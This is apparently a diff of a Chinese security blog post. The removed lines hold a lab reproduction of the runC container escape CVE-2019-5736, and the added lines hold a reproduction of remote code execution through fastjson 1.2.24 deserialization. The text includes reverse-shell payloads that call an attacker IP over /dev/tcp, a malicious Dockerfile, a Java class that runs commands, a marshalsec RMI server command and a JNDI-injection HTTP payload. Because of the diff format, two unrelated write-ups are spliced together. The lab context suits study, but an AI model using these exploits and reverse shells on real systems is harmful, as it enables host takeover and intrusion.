-<p><strong>OPTIONS 说明:</strong></p>
-<p><strong>-d:</strong> 后台运行容器，并返回容器ID</p>
-<p><strong>-p:</strong> 指定端口映射，格式为：主机(宿主)端口:容器端口</p>
-<p><strong>–name</strong> “名称 “ : 为容器指定一个名称；</p>
-<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><hr>
-<p>Go语言（也称为Golang）是google在2009年推出的一种编译型编程语言。 相对于大多数语言，golang具有编写并发或网络交互简单、丰富的数据类型、编译快等特点，比较适合于高性能、高并发场景。 … golang正是由一个强大团队利用这20%时间开发的。</p>
-<h4 id="Golang-常用命令"><a href="#Golang-常用命令" class="headerlink" title="Golang 常用命令"></a>Golang 常用命令</h4><p>build: 编译包和依赖。</p>
-<p>run: 编译并运行go程序。</p>
-<p>clean: 移除当前源码包里面编译生成的文件。</p>
-<p>fmt: 运行gofmt进行格式化。</p>
-<p>get: 下载并安装包和依赖。</p>
-<p>install: 编译并安装包和依赖。</p>
-<p>list: 列出包。</p>
-<p>version: 显示当前环境安装go的版本</p>
-<h4 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h4><ul>
-<li><strong>多平台 ( <code>交叉编译</code> )</strong></li>
-</ul>
-<p><strong>一、Mac 下编译 Linux 和 Windows 64位可执行程序</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=linux </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
-
-<p><strong>二、Linux 下编译 Mac 和 Windows 64位可执行程序</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=darwin </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">CGO_ENABLED=0 </span><br><span class="line">GOOS=windows </span><br><span class="line">GOARCH=amd64 </span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
-
-<p><strong>三、Windows 下编译 Mac 和 Linux 64位可执行程序</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">  </span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
-
-<p><code>GOOS</code>：目标平台的操作系统（darwin、freebsd、linux、windows） GOARCH：目标平台的体系架构（386、amd64、arm） 交叉编译不支持 CGO 所以要禁用它</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装Ubuntu-16-04"><a href="#安装Ubuntu-16-04" class="headerlink" title="安装Ubuntu 16.04"></a>安装Ubuntu 16.04</h3><hr>
-<p>首先从官网下载镜像 ,</p>
-<p>下载地址: <a href="https://releases.ubuntu.com/16.04/">https://releases.ubuntu.com/16.04/</a></p>
-<p>使用 Vmware Workstation 虚拟机进行安装</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916928.png" alt="image-20211201133831599"></p>
-<p>安装完毕, 会自动安装 Vmware-tools</p>
-<p>如若没有 , 可以手动进行安装 , 详情参考 <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">vmware 官方文档</a></p>
-<p>[+] <strong>官方文档 :</strong>  <a href="https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html">https://docs.vmware.com/cn/VMware-Tools/11.3.0/com.vmware.vsphere.vmwaretools.doc/GUID-C48E1F14-240D-4DD1-8D4C-25B6EBE4BB0F.html</a></p>
-<ul>
-<li><strong>Ubuntu、Debian 及相关操作系统</strong></li>
-</ul>
-<ol>
-<li><p>请确保已更新软件包索引：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果虚拟机具有 GUI（X11 等），请安装或升级<br>open-vm-tools-desktop：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>否则，请使用以下命令安装<br>open-vm-tools：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="安装Docker-环境"><a href="#安装Docker-环境" class="headerlink" title="安装Docker 环境"></a>安装Docker 环境</h3><hr>
-<blockquote>
-<p>  <strong>Linux 环境</strong>:  Ubuntu 16.04</p>
-</blockquote>
-<blockquote>
-<p>  <strong>docker 版本</strong></p>
-<ul>
-<li>docker version &lt;&#x3D;18.09.2</li>
-<li>RunC version &lt;&#x3D;1.0-rc6</li>
-</ul>
-</blockquote>
-<h4 id="脚本搭建过程"><a href="#脚本搭建过程" class="headerlink" title="脚本搭建过程"></a><strong>脚本搭建过程</strong></h4><blockquote>
-<p>  (支持<strong>Ubuntu</strong> 和 <strong>CentOS</strong>) </p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对fastjson版本小于1.2.48的版本通杀，autoType为关闭状态也可使用。</span><br><span class="line">loadClass中默认cache设置为true，利用分为2步执行，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetImpl这个类，绕过了黑名单机制</span><br><span class="line">该payload会利用fastjson的反序列化漏洞去指定的rmi/ldap服务进行远程方法调用</span><br></pre></td></tr></table></figure>
 
 
-
-<h4 id="手工搭建过程"><a href="#手工搭建过程" class="headerlink" title="手工搭建过程"></a><strong>手工搭建过程</strong></h4><p>Ubuntu</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; \</span><br><span class="line">sudo VERSION=18.06.0 sh get-docker.sh</span><br></pre></td></tr></table></figure>
-
-<p>1、更新索引包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
-
-<p>2、安装以下包，以使 apt 可以通过 https 使用 repository</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
-
-<p>3、添加Docker官方的GPG密钥并更新索引包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -` `</span><br><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装指定的docker版本</li>
-</ul>
-<p>1、列出可用版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917408.png" alt="image-20211206140408904"></p>
-<p>2、选择一个版本来安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce=&lt;VERSION&gt;</span><br><span class="line">比如： $ sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</span><br></pre></td></tr></table></figure>
-
-<p>3、查看是否安装正常</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start docker` `$ docker info</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="配置GoLang环境"><a href="#配置GoLang环境" class="headerlink" title="配置GoLang环境"></a>配置GoLang环境</h3><hr>
-<h4 id="安装Golang"><a href="#安装Golang" class="headerlink" title="安装Golang"></a>安装Golang</h4><p>apt安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br></pre></td></tr></table></figure>
-
-<p>官网 源码 编译安装</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先拉取 一个容器 例如 &#x3D;&#x3D;Ubuntu 16.04&#x3D;&#x3D; </p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull ubuntu:16.04</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290916939.png" alt="image-20211022222251029"></p>
-<p>启动容器</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -it b6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917870.png" alt="image-20211022222830729"></p>
-<p>这里通过 exec 命令模拟 黑客 获取到容器的root权限的shell</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it 35 bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917219.png" alt="image-20211022223004305"></p>
-<h3 id="复现方式一"><a href="#复现方式一" class="headerlink" title="复现方式一"></a>复现方式一</h3><p>使用poc进行攻击，github 项目地址:</p>
-<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
-<p>循环等待 runC init的 PID -&gt; open(“&#x2F;proc&#x2F;pid&#x2F;exe”，O_RDONLY) -&gt; execve()释放 runC的IO并覆盖runC二进制文件 -&gt; execve()执行被覆盖 runC</p>
-<p>修改payload</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n /bin/bash -i &gt;&amp; /dev/tcp/192.168.119.137/9999 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917901.png" alt="image-20211206150536431"></p>
-<p>修改poc , bash 也可getshell</p>
-<p>修改payload, 编译poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go build main.go</span><br></pre></td></tr></table></figure>
-
-<p>上传 , 执行poc文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917173.png" alt="image-20211022223803309"></p>
-<p>此时, 如果用户从宿主机通过exec命令进入容器内容 , 就能成功触发poc</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917438.png" alt="image-20211022224107696"></p>
-<p>攻击机成功收到 反弹shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290917091.png" alt="image-20211022224359412"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看 ip , 确定shell 来自宿主机</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918481.png" alt="image-20211022224302900"></p>
-<h3 id="复现方式二"><a href="#复现方式二" class="headerlink" title="复现方式二"></a>复现方式二</h3><p>构造有漏洞的容器镜像, 完成漏洞复现</p>
-<p>GitHub 地址: <strong><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></strong></p>
-<p>思路: 研究人员通过欺骗runC init execve -&gt; runc 执行&#x2F;proc&#x2F;self&#x2F;exe -&gt; &#x2F;proc&#x2F;[runc-pid]&#x2F;exe覆盖runC 二进制文件</p>
-<blockquote>
-<p>  Dockerfile文件</p>
-</blockquote>
-<p>1.获取libseccomp文件并将run_at_link文件加入，runC启动运行libseccomp。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD run_at_link.c /root/run_at_link.c</span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root/libseccomp-* ;\</span><br><span class="line">    cat /root/run_at_link.c &gt;&gt; src/api.c ;\</span><br><span class="line">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span><br><span class="line">    dpkg -i /root/*.deb</span><br></pre></td></tr></table></figure>
-
-<p>2.overwrite_runc添加docker中并编译 3.使入口点指向runc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN set -e -x ;\</span><br><span class="line">    ln -s /proc/self/exe /entrypoint</span><br><span class="line">ENTRYPOINT [ &quot;/entrypoint&quot; ]</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>  run_at_link文件</p>
+<p>主机A： <a href="http://192.168.56.106:8090/">http://192.168.56.106:8090</a> (存在Fastjson漏洞主机)</p>
+<p>主机B： <a href="http://192.168.56.1:8989/">http://192.168.56.1:8989</a> (恶意java类服务)</p>
+<p>主机C： rmi:&#x2F;&#x2F;192.168.56.1:9999 (远程方法调用服务)</p>
+<p> PS:   实际上主机B和C是一台机器不同端口</p>
 </blockquote>
-<p>1.run_at_link read runc binary 获得fd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int runc_fd_read = open(&quot;/proc/self/exe&quot;, O_RDONLY);</span><br><span class="line">    if (runc_fd_read == -1 ) &#123;</span><br><span class="line">        printf(&quot;[!] can&#x27;t open /proc/self/exe\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Opened runC for reading as /proc/self/fd/%d\n&quot;, runc_fd_read);</span><br><span class="line">    fflush(stdout);</span><br></pre></td></tr></table></figure>
+<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson&#x2F;1.2.24-rce"></a>fastjson&#x2F;1.2.24-rce</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>2.调用execve执行overwrite_runc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/overwrite_runc&quot;, argv_overwrite, NULL); </span><br></pre></td></tr></table></figure>
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143662.png" alt="image-20210901132856918" style="zoom:80%;" />
 
-<p>3.overwrite_runc写入poc string</p>
-<hr>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd RunC-CVE-2019-5736</span><br><span class="line">$ docker build -t cve-2019-5736:malicious_image_POC ./malicious_image_POC</span><br><span class="line">$ docker run --rm cve-2019-5736:malicious_image_POC</span><br></pre></td></tr></table></figure>
+<p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，</p>
+<p>可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
+<p>Command ： <code>touch /tmp/success</code>   </p>
+<blockquote>
+<h5 id="TouchFile-java"><a href="#TouchFile-java" class="headerlink" title="TouchFile.java"></a>TouchFile.java</h5></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>修改 new_runc , 修改接收反弹shell 的地址</p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918319.png" alt="image-20211202101831715"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+<p>借助<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1：8989/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918255.png" alt="image-20211202101719829"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918493.png" alt="image-20211202101522575"></p>
-<p>接收反弹shell </p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918457.png" alt="image-20211202101656476"></p>
-<p>查看ip , 确认为 宿主机 </p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919450.png" alt="image-20211202101715579"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290918264.png" alt="image-20211202101936883"></p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p>
-<p>先来看<code>/proc/self/exe</code>是什么？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file /proc/self/exe</span><br><span class="line">/proc/self/exe: symbolic link to /usr/bin/file</span><br></pre></td></tr></table></figure>
+<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143924.png" alt="image-20210901133439751" style="zoom:80%;" />
 
-<p>proc&#x2F;self&#x2F;exe符号链接会指向调用者自身，同理proc&#x2F;pid&#x2F;exe会指向pid进程的调用者。但是&#x2F;proc&#x2F;pid&#x2F;exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开&#x2F;proc&#x2F;pid&#x2F;exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p>
-<p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过&#x2F;proc&#x2F;self&#x2F;exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行&#x2F;proc&#x2F;self&#x2F;exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p>
-<p>具体的利用步骤：</p>
-<ol>
-<li>容器内生成一个恶意文件，将文件的调用者改为proc&#x2F;self&#x2F;exe</li>
-<li>宿主机docker exec调用该恶意文件，会调用proc&#x2F;self&#x2F;exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li>
-<li>得到容器进称号PID后，可以获取&#x2F;proc&#x2F;pid&#x2F;exe文件描述符fd</li>
-<li>对fd进行写操作，覆盖原有runc的文件</li>
-</ol>
-<p><strong>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</strong></p>
-<p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取&#x2F;proc&#x2F;PID&#x2F;exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p>
-<p><strong>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</strong></p>
-<p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p>
-<h3 id="seebug"><a href="#seebug" class="headerlink" title="seebug"></a>seebug</h3><p><strong>runC利用链分析</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" alt="image-20211208090108977"></p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>更新至 最新版本</p>
-<p>官方修复方式</p>
-<p>链接: <a href="https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919593.png" alt="image-20211208093157249"></p>
-<p>增加了一个<code>ensure_cloned_binary</code>函数</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ensure_cloned_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> execfd;</span><br><span class="line">    char **argv = NULL, **envp = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that we&#x27;re not self-cloned, and if we are then bail. */</span></span><br><span class="line">    <span class="type">int</span> cloned = is_self_cloned();</span><br><span class="line">    <span class="keyword">if</span> (cloned &gt; <span class="number">0</span> || cloned == -ENOTRECOVERABLE)</span><br><span class="line">        <span class="keyword">return</span> cloned;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fetchve(&amp;argv, &amp;envp) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    execfd = clone_binary();</span><br><span class="line">    <span class="keyword">if</span> (execfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">    fexecve(execfd, argv, envp);</span><br><span class="line">    <span class="keyword">return</span> -ENOEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static <span class="type">int</span> is_self_cloned(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, ret, is_cloned = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    ret = fcntl(fd, F_GET_SEALS);</span><br><span class="line">    is_cloned = (ret == RUNC_MEMFD_SEALS);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">struct</span> stat statbuf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ret = fstat(fd, &amp;statbuf);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">        is_cloned = (statbuf.st_nlink == <span class="number">0</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> is_cloned;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用python 搭建一个简单的http服务器</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
 
-<p>判断<code>/proc/self/exe</code>是否被clone，如果没有的话，则执行<code>clone_binary</code>函数，返回一个新的file handler。</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">static <span class="type">int</span> clone_binary(void)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> binfd, memfd;</span><br><span class="line">    ssize_t sent = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    memfd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    memfd = open(<span class="string">&quot;/tmp&quot;</span>, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, <span class="number">0711</span>);</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">if</span> (memfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOTRECOVERABLE;</span><br><span class="line"></span><br><span class="line">    binfd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (binfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    sent = sendfile(memfd, binfd, NULL, RUNC_SENDFILE_MAX);</span><br><span class="line">    <span class="built_in">close</span>(binfd);</span><br><span class="line">    <span class="keyword">if</span> (sent &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">#ifdef HAVE_MEMFD_CREATE</span><br><span class="line">    <span class="type">int</span> err = fcntl(memfd, F_ADD_SEALS, RUNC_MEMFD_SEALS);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Need to re-open &quot;memfd&quot; as read-only to avoid execve(2) giving -EXTBUSY. */</span></span><br><span class="line">    <span class="type">int</span> newfd;</span><br><span class="line">    char *fdpath = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fdpath, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, memfd) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line">    newfd = open(fdpath, O_RDONLY | O_CLOEXEC);</span><br><span class="line">    free(fdpath);</span><br><span class="line">    <span class="keyword">if</span> (newfd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> <span class="type">error</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    memfd = newfd;</span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">return</span> memfd;</span><br><span class="line"></span><br><span class="line"><span class="type">error</span>:</span><br><span class="line">    <span class="built_in">close</span>(memfd);</span><br><span class="line">    <span class="keyword">return</span> -EIO;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312143667.png" alt="image-20210901133540829" style="zoom:80%;" />
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a><strong>Payload</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144666.png" alt="image-20210901133841607"></p>
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144883.png" alt="image-20210901134528910" style="zoom:67%;" />
 
 
 
+<p>可见命令执行成功！漏洞成功复现</p>
+<img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312150318.png" alt="image-20210901133735111" style="zoom:67%;" />
+
+
+
